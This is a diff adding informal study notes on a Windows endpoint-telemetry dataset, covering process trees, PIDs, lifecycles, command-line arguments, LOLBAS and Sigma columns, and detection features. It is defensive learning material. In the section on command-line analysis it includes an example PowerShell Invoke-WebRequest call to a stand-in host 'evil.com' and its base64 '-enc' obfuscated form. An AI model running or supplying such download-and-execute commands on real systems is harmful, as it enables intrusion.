@@ -1,0 +1,143 @@
+Need to understand: 
+- processes
+- parent-child relationships
+- authentication
+- command lines
+- netowork connections
+
+The data looks like 'aggregated endpoint telemetry per process or process session data'. like its not raw event logs and instead engineered aggregations/features
+
+*Big thing to transition from is moving from what are these columns, to what behavior do these columns represent?*
+
+## Process Execution
+- core telemetry cols
+    - process_name: the process that was run
+    - args
+    - parent_pid_hash: parent? 
+    - parent_os_pid: parent? 
+    - process_path
+    - process_started
+    - duration_seconds
+    - token_elevation_type
+- others
+    - file, registr, network, dll cols: what did it do?
+    - sigma, lolbas, mitre: was it suspicious? 
+
+- what is a process?
+    A process is a running program and a program is a file sitting on the disk. A process is what happens when the program is actually running. e.g. File: C:Windows\System32\notepad.exe and the running process: notepad.exe with PID 4821
+    In our data we might have:
+        process_name: powershell.exe (what ran?) this is what is running at this moment
+        process_path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (where did it run from?)
+        os_pid: 4420
+        process_started: 2024-01-05 
+        duration_seconds: 8.1
+        user_name: who ran it?
+        This just means powershell ran on the machine for 8.1 duration_seconds
+    PID: a temporary number Windows gives to a running process. Its important to know the PIDs are reused
+    so `os_pid` is likely the raw Windows process instead and `pid_hash` is likely a safer UUID. 
+    
+- If pids get reused, why does parent_os_pid matter?
+    By itself, a pid is not meaningful. E.g at 1000 pid = 4000 = chrome.exe, at 1400 pid = 4000 = powershell.exe. But its useful inside a short time window. We dont have the parent_os_pid name, but we can find what the parent process was if we look elsewhere. meaning if we have a row process_name powershell.exe, os_pid 5000, parent_os_pid 2000 and somewhere else we see that windword.exe has os_pid 2000, we can infer that for the first process, the parent was winword.exe
+    while the process is alive, pid unqiue identifies it on that machine. pid alone is not globally unique, but host + pid + timestamp is. different computers could both have pid 4420 and that pid mean diff things. so important to combine host and pid to see if this process being activated on this computer is suspicious
+    
+
+- what is parent_pid_hash?
+    - probably isnt just the pid alone, it might be a has of host + pid + timestamp. this solves the pid reuse problem. why are hashes useful. suppose pid 5000 exists 10 different times over a week, a hash can distinguish process a, b and c even if all reused pid 5000. we care more about the process instances, not just process names
+
+
+- what is a parent/child relationship?
+
+    A parent process is the process that started another process. If you double-click Chrome from desktop it usually means `explorer.exe > chrome.exe` where `explorer.exe` is a Windows File Explorer 
+    A child process is a process launched by another process. If you open Command Prompt and type notepad it really means `cmd.exe > notepad.exe`. The parent is cmd.exe and the child is notepad.exe
+    This relationship is important in cyber telemetry because the same process can be normal or suspicious depending on its parent. Not all processes are bad, but knowing the parent-child process allows you to figure out what is normal and suspicious. E.g. PowerShell is a normal Windows tool. `explorer.exe > powershell.exe` meaning a user opened PowerShell manually. However `winword.exe > powershell.exe` is suspicious because Microsoft Word launched PowerShell. Or if `chrome.exe > powershell.exe` meaning a browser launched PowerShell. This is unusual. **In cyber its normal to ask, is this child process normal for this parent process**
+    
+- what is a process tree?
+
+    A process tree shows a chain of parent-child relationships. E.g. explorer.exe > chrome.exe > powershell.exe > cmd.exe > whoami.exe
+    This would be suspicious and useful because an attacker often checks who's computer the person is, what permissions they have and what machine are they on. 
+    
+- what are process lifecycles?
+
+    A process lifecycle is the life story of a process: created > ran > did things > exited
+    In the dataset this maps to:
+        - process_started: time it started
+        - process_stop_seconds: look at terminatethe histogram this. all numbers are 1.72xx 1e9. guess is that these are unix epoch timestamps meaning seconds since jan 1, 1970. 
+        - process_term: when did the process  (time)
+        - duration_seconds: how long it took (seconds)
+        - exit_code: when a process exits, it returns a status code. usually 0 = success and a non 0 means error, crash, failure. a windows error we see is very large could just be that the dataset converted it this way. for example: the windows err 0xC0000005 means access violation but its sometimes stored as 3221225477. i want to say something like 99% are 0 with some outliers again in the 1e9 range. important because malware crashes, fails privilege escalation, fails injection, terminates abnormally. 
+
+    E.g.:
+        powershell.exe started at 10:00:01
+        powershell.exe read files
+        powershell.exe wrote registry keys
+        powershell.exe connected to netowork
+        powershell.exe stopped at 10:00:09
+        duration_seconds = 8
+
+
+For every process row, I should be asking:
+    what ran? who ran it? when did it run? what started it? how long did it run? what did it do?
+
+
+top process_names:
+    conost.exe: console window host (usually associated with cmd.exe, powershell, terminal programs)
+    wmic.exe: windows management instrumental command-line (used for querying system info, remote administration)
+    firefox.exe 
+    svchost.exe: important windows system process that hosts windows services
+    updater.exe: could be a benign software updater or malware pretending to be an updater. need the process_path, parent process and netowrk behavior to know more
+
+what are `args`:
+    - args are command line arguments, we can think of these as the intructions. we could have a process_name and then the args are what instructions were added to these. here we'll see powershell commands, encoded commands, suspicious execution, lolbas abuse, attacker intent. 
+    - the could be stuff like finding out what machine theyre on, hostname, os version, users, permissions, antivirus info. remember that stuff like whoami, hostname, etc are not malicious by themselves, but the suspicious part is the timing, sequences, context, parent process, frequency
+
+Why is command-line analysis important? 
+    because attackers intent often appear in the arguments, not just the process name.
+    note: attackers might hide commands using base64 encoding. so instead of powershell.exe Invoke-WebRequest evil.com, they would run powershell.exe -enc SQBuAHyAbEOSIdsUIFPKJRNhgse. This is just a method of obfuscation. Its not always suspicious, but it is highly suspicious in many enterprise environments. Normal users rarely run -enc. Admin sometimes do, attackers do very often. Its a strong signal not proof of malware
+
+What long/high-entropy commands matter?
+    Entropy is randomness. An example of low entropy is `dir`, high entropy is SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==
+    High entropy commands are used to obfuscate urls, malware, scripts, payloads.
+
+
+File and registry activity
+    These show how processes interact with files and windows registry
+    - reg_reads
+    - reg_writes
+    - Create_Events
+    - Delete_Events
+    - Rename_Events
+    - Write_Bytes
+    
+    attackers touch the registry for persistence? meaning malware gets added to startup keys. 
+
+
+Network telemetry
+    - tcp_connect_count
+    - tcp_send_size
+    - udp_send_count
+    - net_send_vs_recv
+    - avg_bytes
+
+Dlls
+    DLLs are dynamically loaded libraries. Attackers inject DLLs, sideload DLLs, abuse trusted DLL behavior. These cols load supporting code libraries. 
+    - Dlls
+    - dll_num_uniq_files
+
+Sigma Rules
+    I beleive these are detectio rules. Apparently theyre SIEM detection rules whatever that means. 
+    - high_num_sigma_hits
+    - critical_num_sigma_hits
+
+lolbas
+    Living Off The Land Binaries and scripts. These are windows tools abused by attckers
+    - lolbas_privs
+    - lolbas_cats
+    - lolbas_mitre
+
+This detection problem is more of a behavior relationship anaysis, not necessarily this file is evil. looking for anything unusual which is why graphs, anomally detection, HMMs, entropy and sequence analysis important
+
+Feature Engineering:
+- entropy of arguments
+- length of arguments
+- if args include -enc
+
